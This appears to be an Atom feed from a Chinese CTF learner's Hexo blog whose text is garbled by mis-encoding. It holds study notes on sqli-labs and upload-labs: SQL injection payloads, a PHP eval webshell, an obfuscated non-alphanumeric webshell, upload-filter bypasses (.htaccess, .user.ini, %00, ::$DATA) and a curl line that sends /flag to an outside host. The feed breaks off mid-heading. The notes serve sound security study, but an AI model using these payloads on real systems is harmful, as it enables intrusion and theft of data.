<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tcyDxz</title>
  
  <subtitle>æ¯å¤©éƒ½è¦å¼€å¿ƒ</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-12-04T14:00:40.197Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>uploads</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF</title>
    <link href="http://example.com/2020/12/04/BUUCTF/"/>
    <id>http://example.com/2020/12/04/BUUCTF/</id>
    <published>2020-12-04T13:54:36.000Z</published>
    <updated>2020-12-04T14:00:40.197Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

</summary>
      
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/categories/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>zhe dream&#39;s begin</title>
    <link href="http://example.com/2020/12/04/zhe-dream-s-begin/"/>
    <id>http://example.com/2020/12/04/zhe-dream-s-begin/</id>
    <published>2020-12-04T12:20:20.000Z</published>
    <updated>2020-12-04T13:52:11.002Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä»Šå¤©æ‰æŠŠåšå®¢å¼„å¥½ï¼ï¼ï¼ä»¥åè¯·å¤šå¤šæŒ‡æ•™äº†ï¼ˆå¼„çš„è¿˜å‡‘åˆæŠŠğŸ˜„ï¼‰ï¼ï¼ï¼</span><br><span class="line">æœ¬æ¥æ‰“ç®—å¯’å‡å¼„å‘¢ï¼å¯ä»¥æœ€è¿‘ä¸æƒ³åšé¢˜äº†ï¼</span><br><span class="line">æœ‰ç‚¹ç´¯ï¼åˆåŠ ä¸Šæœ‰å¥³æœ‹å‹äº†ï¼è¶…çº§å¼€å¿ƒï¼ï¼ï¼åŠ æ²¹ï¼</span><br><span class="line">ä»¥åè¿™é‡Œå°†æ˜¯æˆ‘å­¦ä¹ å’Œç”Ÿæ´»åˆ†äº«çš„åœ°æ–¹ï¼ï¼ï¼</span><br><span class="line">åŠ æ²¹ï¼Œtcy!</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.shutterstock.com/image-photo/dangerous-hooded-hacker-breaks-into-260nw-680075014.jpg" alt="å±é™©çš„è’™é¢é»‘å®¢é—¯å…¥æ”¿åºœæ•°æ®æœåŠ¡å™¨ï¼Œå¹¶æ„ŸæŸ“ä»–ä»¬çš„ç³»ç»Ÿä¸ç—…æ¯’ã€‚ ä»–çš„è—èº«ä¹‹åœ°æœ‰é»‘æš—çš„æ°”æ°›ï¼Œå¤šä¸ªæ˜¾ç¤ºå™¨ï¼Œç”µç¼†æ— å¤„ä¸åœ¨ã€‚"></p>]]></content>
    
    
    <summary type="html">å¼€å§‹æ¯å¤©å†™åšå®¢å­¦ä¹ äº†ï¼åŠ æ²¹ï¼</summary>
    
    
    
    <category term="åŠ æ²¹ï¼ï¼" scheme="http://example.com/categories/%E5%8A%A0%E6%B2%B9%EF%BC%81%EF%BC%81/"/>
    
    
    <category term="çƒ­çˆ±" scheme="http://example.com/tags/%E7%83%AD%E7%88%B1/"/>
    
  </entry>
  
  <entry>
    <title>My New Post</title>
    <link href="http://example.com/2020/12/04/My-New-Post/"/>
    <id>http://example.com/2020/12/04/My-New-Post/</id>
    <published>2020-12-04T05:43:28.000Z</published>
    <updated>2020-12-04T05:43:28.568Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>webæ¼æ´</title>
    <link href="http://example.com/2020/10/21/web%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2020/10/21/web%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-21T12:03:12.000Z</published>
    <updated>2020-12-04T05:40:22.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¸¸è§æ¼æ´"><a href="#å¸¸è§æ¼æ´" class="headerlink" title="å¸¸è§æ¼æ´"></a>å¸¸è§æ¼æ´</h2><h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><h4 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h4><p>sqli-labs less-1</p><ul><li><p>åˆ¤æ–­åå°sqlè¯­å¥é—­åˆæ–¹å¼</p></li><li><p>order byåˆ¤æ–­åˆ—æ•°</p></li><li><p>åˆ¤æ–­å›æ˜¾ä½</p></li><li><p>æ³¨æ•°æ®</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br><span class="line">select * from users where id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br><span class="line">select * from users where id&#x3D;&#39;1&#39;#&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 %23</span><br><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure><h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><p>sqli-labs Less-5</p><p>boolç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 0%23</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(substr(database(),1,1)&#x3D;&#39;s&#39;,1,0)%23</span><br><span class="line"></span><br><span class="line">1 and 1  &#x3D;&#x3D;&gt; 1</span><br><span class="line">0 or 1  &#x3D;&#x3D;&gt; 1</span><br></pre></td></tr></table></figure><p>å»¶æ—¶æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><p>sqli-labs Less-5</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; and updatexml(1,concat(0x7e,database()),1)%23</span><br></pre></td></tr></table></figure><p>updatexml(XML_document, XPath_string, new_value)</p><p>XML_documentæ˜¯æ–‡æ¡£å¯¹è±¡çš„åç§°</p><p>XPath_stringæ˜¯XPathæ ¼å¼çš„å­—ç¬¦ä¸²(å¦‚æœXPath_stringä¸æ˜¯XPathæ ¼å¼ï¼Œåˆ™ä¼šæŠ¥é”™å¹¶æ˜¾ç¤ºå‡ºXPath_stringçš„å€¼)</p><p>new_valueæ›¿æ¢æŸ¥æ‰¾åˆ°çš„æ•°æ®</p><h3 id="æ–‡ä»¶ä¸Šä¼ -amp-æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶ä¸Šä¼ -amp-æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«</h3><h4 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h4><p>php3 php5 phtml .htaccess .user.ini</p><h4 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h4><p>æ²¡åŠæ³•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æ´ è§£ææ¼æ´</p><h4 id="å„ç§åŒ…å«getshell"><a href="#å„ç§åŒ…å«getshell" class="headerlink" title="å„ç§åŒ…å«getshell"></a>å„ç§åŒ…å«getshell</h4><p>ç®€å•çš„åŒ…å«å›¾ç‰‡é©¬</p><p>åŒ…å«<code>data://</code> <code>php://input</code> ä¸phpçš„é…ç½®æœ‰å…³</p><h3 id="ä»£ç æ³¨å…¥-amp-å‘½ä»¤æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥-amp-å‘½ä»¤æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥&amp;å‘½ä»¤æ³¨å…¥"></a>ä»£ç æ³¨å…¥&amp;å‘½ä»¤æ³¨å…¥</h3><h4 id="ä¸€äº›æ•æ„Ÿçš„å‡½æ•°"><a href="#ä¸€äº›æ•æ„Ÿçš„å‡½æ•°" class="headerlink" title="ä¸€äº›æ•æ„Ÿçš„å‡½æ•°"></a>ä¸€äº›æ•æ„Ÿçš„å‡½æ•°</h4><p>system shell_exec `` exec   â€¦..</p><p>eval assert</p><h4 id="phpè¯­è¨€çš„ç‰¹æ€§"><a href="#phpè¯­è¨€çš„ç‰¹æ€§" class="headerlink" title="phpè¯­è¨€çš„ç‰¹æ€§"></a>phpè¯­è¨€çš„ç‰¹æ€§</h4><p>æ— å­—æ¯æ•°å­—webshell å¼‚æˆ– å–å</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; echo urlencode(~&#39;system&#39;);</span><br><span class="line">(~urldecode(&#39;%8C%86%8C%8B%9A%92&#39;))(&#39;id&#39;);</span><br></pre></td></tr></table></figure><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dnsbin.zhack.ca&#x2F;</span><br><span class="line"></span><br><span class="line">curl 1.1.1.1:9000&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><ul><li>ååºåˆ—åŒ–ä¸­é­”æœ¯æ–¹æ³•çš„è°ƒç”¨â€”-&gt;popé“¾</li></ul>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;moonback1314.gitee.io&#x2F;2019&#x2F;10&#x2F;27&#x2F;php-serialize&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;680&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;moonback1314.gitee.io&#x2F;2019&#x2F;10&#x2F;27&#x2F;php-serialize&#x2F;20191027210743.png</span><br></pre></td></tr></table></figure><h2 id="å­¦ä¹ çš„ä¸€äº›å»ºè®®"><a href="#å­¦ä¹ çš„ä¸€äº›å»ºè®®" class="headerlink" title="å­¦ä¹ çš„ä¸€äº›å»ºè®®"></a>å­¦ä¹ çš„ä¸€äº›å»ºè®®</h2><h3 id="å¤šå…³æ³¨åœˆå­ç¤¾åŒºå…¬ä¼—å·å¤§ä½¬åšå®¢"><a href="#å¤šå…³æ³¨åœˆå­ç¤¾åŒºå…¬ä¼—å·å¤§ä½¬åšå®¢" class="headerlink" title="å¤šå…³æ³¨åœˆå­ç¤¾åŒºå…¬ä¼—å·å¤§ä½¬åšå®¢"></a>å¤šå…³æ³¨åœˆå­ç¤¾åŒºå…¬ä¼—å·å¤§ä½¬åšå®¢</h3><p><a href="https://xz.aliyun.com/">https://xz.aliyun.com</a></p><p><a href="https://www.anquanke.com/">https://www.anquanke.com</a></p><p><a href="https://paper.seebug.org/">https://paper.seebug.org</a></p><p><a href="https://www.t00ls.net/">https://www.t00ls.net</a></p><p><a href="https://www.freebuf.com/">https://www.freebuf.com</a></p><p><a href="https://www.leavesongs.com/">https://www.leavesongs.com</a></p><p><a href="https://skysec.top/">https://skysec.top</a></p><p><a href="https://www.smi1e.top/">https://www.smi1e.top</a></p><p><a href="http://www.gem-love.com/">http://www.gem-love.com</a></p><h3 id="æ¯”èµ›"><a href="#æ¯”èµ›" class="headerlink" title="æ¯”èµ›"></a>æ¯”èµ›</h3><p><a href="https://ctftime.org/">https://ctftime.org/</a></p><p>å¾®ä¿¡å°ç¨‹åºä¿¡å®‰å¤§èµ›</p><p>qqç¾¤</p><h3 id="åšé¢˜å¹³å°"><a href="#åšé¢˜å¹³å°" class="headerlink" title="åšé¢˜å¹³å°"></a>åšé¢˜å¹³å°</h3><p><a href="https://buuoj.cn/">https://buuoj.cn</a></p><p><a href="https://www.ctfhub.com/">https://www.ctfhub.com</a></p><p><a href="https://www.jarvisoj.com/">https://www.jarvisoj.com</a></p><p><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a></p><p><a href="https://cgctf.nuptsast.com/">https://cgctf.nuptsast.com</a></p><p><a href="https://ctf.show/">https://ctf.show</a></p><p><a href="https://www.bugku.com/">https://www.bugku.com</a></p><h3 id="å¤šæœå¤šçœ‹"><a href="#å¤šæœå¤šçœ‹" class="headerlink" title="å¤šæœå¤šçœ‹"></a>å¤šæœå¤šçœ‹</h3><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p><a href="https://www.google.com/">https://www.google.com</a></p><p><a href="http://www.baidu.com/">http://www.baidu.com</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å¸¸è§æ¼æ´&quot;&gt;&lt;a href=&quot;#å¸¸è§æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;å¸¸è§æ¼æ´&quot;&gt;&lt;/a&gt;å¸¸è§æ¼æ´&lt;/h2&gt;&lt;h3 id=&quot;sqlæ³¨å…¥&quot;&gt;&lt;a href=&quot;#sqlæ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;sqlæ³¨å…¥&quot;&gt;</summary>
      
    
    
    
    <category term="sqlæ³¨å…¥" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="webæ¼æ´" scheme="http://example.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <link href="http://example.com/2020/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2020/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-10-21T12:02:07.000Z</published>
    <updated>2020-12-04T05:41:05.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/04/24/5cbfe060c7285.png" alt="img"></p><p>upload-labs:</p><p>æ–‡ä»¶ä¸Šä¼ å‡ºé¢˜ç»•è¿‡ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">       $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">       $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure><p>%00:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br></pre></td></tr></table></figure><h4 id="åšé¢˜æ€è·¯ï¼š"><a href="#åšé¢˜æ€è·¯ï¼š" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h4><p>èœåˆ€ï¼Œèšå‰‘åªèƒ½ç»ƒä¸Šphpï¼Œaspçš„æ–‡ä»¶ï¼</p><h4 id="èœå‘€ï¼š"><a href="#èœå‘€ï¼š" class="headerlink" title="èœå‘€ï¼š"></a>èœå‘€ï¼š</h4><p>è¾“å…¥èœåˆ€çš„æ—¶å€™è¦è¾“å…¥ä½ ä¸Šä¼ æ–‡ä»¶åçš„åœ°å€!!!!!!</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.161&#x2F;uploadlabs&#x2F;upload&#x2F;upload&#x2F;flag.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;tao&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpinfo();</p><p>flag.php æ˜¯ä¸€å¥è¯æœ¨é©¬</p><h3 id="å‡ºé¢˜ç‚¹ï¼š"><a href="#å‡ºé¢˜ç‚¹ï¼š" class="headerlink" title="å‡ºé¢˜ç‚¹ï¼š"></a>å‡ºé¢˜ç‚¹ï¼š</h3><h5 id="1-ä¿®æ”¹æ–‡ä»¶åç¼€ï¼"><a href="#1-ä¿®æ”¹æ–‡ä»¶åç¼€ï¼" class="headerlink" title="1 ä¿®æ”¹æ–‡ä»¶åç¼€ï¼"></a>1 ä¿®æ”¹æ–‡ä»¶åç¼€ï¼</h5><p>bpæŠ“åŒ…ä¿®æ”¹åç¼€ï¼.jpg-&gt;.php</p><h5 id="2éªŒè¯content-type"><a href="#2éªŒè¯content-type" class="headerlink" title="2éªŒè¯content-type"></a>2éªŒè¯content-type</h5><p>bpæŠ“åŒ…ï¼</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;taochiyu.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure><p>æ›¿æ¢<strong>Content-Typeï¼šimage/jpeg</strong></p><h5 id="3é»‘åå•åˆ¤æ–­ï¼Œ"><a href="#3é»‘åå•åˆ¤æ–­ï¼Œ" class="headerlink" title="3é»‘åå•åˆ¤æ–­ï¼Œ"></a>3é»‘åå•åˆ¤æ–­ï¼Œ</h5><p>bpæŠ“åŒ…</p><p>å¤§å°å†™è¢«è¿‡æ»¤äº†ï¼</p><p>äºæ˜¯å°è¯•ç”¨php3,phtmlç»•è¿‡</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190521150539796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI1ODk5NjM1,size_16,color_FFFFFF,t_70" alt="img"></p><h5 id="4-htaccessä¸Šä¼ "><a href="#4-htaccessä¸Šä¼ " class="headerlink" title="4  .htaccessä¸Šä¼ "></a>4  .htaccessä¸Šä¼ </h5><p>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ apacheè¯»å–å®ƒå†…å®¹ç„¶ååŠ è½½åˆ°æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶é‡Œæ‰§è¡Œ</p><p>æ–‡ä»¶å†…å®¹ï¼š</p><p>æŠŠ.jpgçš„æ–‡ä»¶å½“ä½œphpå»è§£æï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè§£æä¸ºphpï¼Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><p>ç„¶åå†ä¸Šä¼ å›¾ç‰‡é©¬</p><p>ä¼šè§£ææˆphpæ–‡ä»¶ï¼</p><h5 id="5è¿‡æ»¤äº†-htaccess-ç”¨-ini"><a href="#5è¿‡æ»¤äº†-htaccess-ç”¨-ini" class="headerlink" title="5è¿‡æ»¤äº†.htaccess ç”¨.ini"></a>5è¿‡æ»¤äº†.htaccess ç”¨.ini</h5><p>.ini ä¸Šä¼ çš„ä»£ç åŠ è½½åˆ°phpçš„é…ç½®æ–‡ä»¶é‡Œæ‰§è¡Œ          <strong>.user.ini</strong></p><p>1 phpè¯­è¨€</p><p>2æœåŠ¡å™¨ä½¿ç”¨CGI</p><p>3ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„PHPæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ **.user.ini **å†ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</p><p>ç„¶ååœ¨æœåŠ¡å™¨çš„ä¸Šä¼ æ–‡ä»¶ç›®å½•ä¸‹ï¼Œè®¿é—®ç›®å½•ä¸‹çš„phpæ–‡ä»¶</p><h5 id="6-å¤§å°å†™ç»•è¿‡"><a href="#6-å¤§å°å†™ç»•è¿‡" class="headerlink" title="6 å¤§å°å†™ç»•è¿‡"></a><strong>6 å¤§å°å†™ç»•è¿‡</strong></h5><p>phP</p><h5 id="7ç©ºæ ¼ç»•è¿‡"><a href="#7ç©ºæ ¼ç»•è¿‡" class="headerlink" title="7ç©ºæ ¼ç»•è¿‡"></a><strong>7ç©ºæ ¼ç»•è¿‡</strong></h5><p>bpæŠ“åŒ…ï¼Œç„¶ååœ¨æ–‡ä»¶åé¢åŠ ä¸Š<strong>ç©ºæ ¼</strong></p><h5 id="8ç‚¹ç»•è¿‡"><a href="#8ç‚¹ç»•è¿‡" class="headerlink" title="8ç‚¹ç»•è¿‡"></a>8ç‚¹ç»•è¿‡</h5><p>bpæŠ“åŒ…ï¼Œç„¶ååœ¨æ–‡ä»¶åé¢åŠ ä¸Š**.**</p><h5 id="9æ²¡æœ‰å»é™¤å­—ç¬¦ä¸²-DATA"><a href="#9æ²¡æœ‰å»é™¤å­—ç¬¦ä¸²-DATA" class="headerlink" title="9æ²¡æœ‰å»é™¤å­—ç¬¦ä¸²::$DATA"></a>9æ²¡æœ‰å»é™¤å­—ç¬¦ä¸²<code>::$DATA</code></h5><p>å¿…é¡»æ˜¯windows, å¿…é¡»æ˜¯php<br>phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å<br>ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åâ€¦.</p><p>ä¸Šä¼ xx.php::$DATAå‘ç°æ— æ³•æ‰¾åˆ°æ­¤æ–‡ä»¶</p><p>windowsä¼šå»æ‰::$DATA ç›´æ¥è®¿é—®xx.phpå³å¯</p><h5 id="10å¤§å°å†™ï¼Œç©ºæ ¼ï¼Œç‚¹éƒ½è¿‡æ»¤"><a href="#10å¤§å°å†™ï¼Œç©ºæ ¼ï¼Œç‚¹éƒ½è¿‡æ»¤" class="headerlink" title="10å¤§å°å†™ï¼Œç©ºæ ¼ï¼Œç‚¹éƒ½è¿‡æ»¤"></a>10å¤§å°å†™ï¼Œç©ºæ ¼ï¼Œç‚¹éƒ½è¿‡æ»¤</h5><p>çœ‹æ˜¯ä¸æ˜¯éƒ½è¿‡æ»¤äº†ï¼Œè¿˜æ˜¯åªè¿‡æ»¤ä¸€ä¸¤ä¸ª</p><p>è¿‡æ»¤ä¸€ä¸¤ä¸ªå¯ä»¥å¤šæ„å»ºå‡ ä¸ªè¿›è¡Œç»•è¿‡ï¼</p><p>.php.ç©ºæ ¼.ç©ºæ ¼s</p><h5 id="11-åŒå†™è¿‡æ»¤str-ireplaceå‡½æ•°"><a href="#11-åŒå†™è¿‡æ»¤str-ireplaceå‡½æ•°" class="headerlink" title="11 åŒå†™è¿‡æ»¤str_ireplaceå‡½æ•°"></a>11 åŒå†™è¿‡æ»¤str_ireplaceå‡½æ•°</h5><p>å› ä¸ºstr_ireplaceå‡½æ•°åªåšä¸€æ¬¡æ›¿æ¢ï¼Œæ‰€ä»¥ä½¿ç”¨pphphpåç¼€åå°±èƒ½ç»•è¿‡</p><h5 id="12-00ç»•è¿‡"><a href="#12-00ç»•è¿‡" class="headerlink" title="12  %00ç»•è¿‡"></a>12  %00ç»•è¿‡</h5><p>php&lt;5.3.4</p><p>ç”¨%00æˆªæ–­ï¼Œè·Ÿcè¯­è¨€ä¸€æ ·ï¼Œphpä¼šå°†%00è§†ä¸ºå­—ç¬¦ä¸²ç»“å°¾</p><p>1ã€phpç‰ˆæœ¬å°äº5.3.4 </p><p>2ã€php.iniçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p><p>ä¸Šä¼ 1.jpgï¼Œç„¶åbpæŠ“åŒ…åœ¨save_pathå¤„æ”¹æˆ/upload/1.php%00</p><p>åœ¨GET å’Œ POSTçš„æƒ…å†µä¸‹ä¸ä¸€æ ·</p><p><strong>GETç›´æ¥%00</strong></p><p><strong>POSTéœ€è¦åœ¨%00çš„åœ°æ–¹åŠ ä¸Šurlç¼–ç  ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»åœ¨hexé‡ŒåŠ ä¸Š00</strong></p><h5 id="14ä¸Šä¼ å›¾ç‰‡ğŸï¼ˆåªæ£€æŸ¥æ–‡ä»¶å¤´ï¼‰è¿™ä¸ªè¦é…åˆæ–‡ä»¶æ–‡ä»¶åŒ…å«æ¼æ´ç”¨"><a href="#14ä¸Šä¼ å›¾ç‰‡ğŸï¼ˆåªæ£€æŸ¥æ–‡ä»¶å¤´ï¼‰è¿™ä¸ªè¦é…åˆæ–‡ä»¶æ–‡ä»¶åŒ…å«æ¼æ´ç”¨" class="headerlink" title="14ä¸Šä¼ 